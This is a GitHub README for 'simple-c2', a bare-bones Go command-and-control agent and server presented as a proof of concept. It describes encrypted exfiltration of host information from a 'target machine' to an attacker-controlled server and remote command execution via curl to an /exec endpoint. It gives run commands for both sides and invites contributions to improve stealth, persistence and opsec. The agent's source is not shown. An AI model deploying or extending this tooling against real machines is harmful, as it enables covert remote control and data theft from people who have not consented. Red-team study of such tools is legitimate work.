# simple-c2

this is a bare bones agent/server in go that supports command execution thru curl.
the project is meant mostly to demonstrate automated encryption, exfiltration, reception, and decryption of data from a target machine to an attacker controlled server (in this case, because its a poc on github, we will be demonstrating it over a localhost connection.)

## how to use 


```bash
go mod tidy 
cd server
go run server.go -gen # to generate the required pub/priv RSA key pair
## then start the server
go run server.go 
## to send and receive commands
curl localhost:8080/latest # returns decrypted result for all commands and initial host info gathering
curl -X POST -d "whoami" localhost:8080/exec # sends the "whoami" command to the agent

## on target machine (must be network joined)
go mod tidy
cd cmd
go run main.go # start the agent, gather host info, and poll for commands from /exec 
```

## technical details

aes-gcm (galois counter mode) for authenticated encryption. we generate a random key at runtime and then encrypt it with the RSA public key to ensure data integrity (there are further precautions we can take, like zeroing the key out of memory when it isn't used, but go's GC should handle that and this is a demo). upon completion of the initial host info gathering the results are encrypted, base64 encoded, and sent to the localhost:8080/test endpoint - if successful, you should be able to curl localhost:8080/latest and see the decrypted and decoded results! to send commands to the agent, you can curl -X POST -d "<command>" localhost:8080/exec, and run the same curl to /latest to receive the decrypted output. this is a minimal demonstration, and i encourage people to submit some PRs to improve the stealth of the agent or its capabilities, harden some bad opsec parts like implementing optional debug prints, or using my go-native-syscall library to do host gathering or persistence etc etc so many options! could be a nice first open source contribution.... 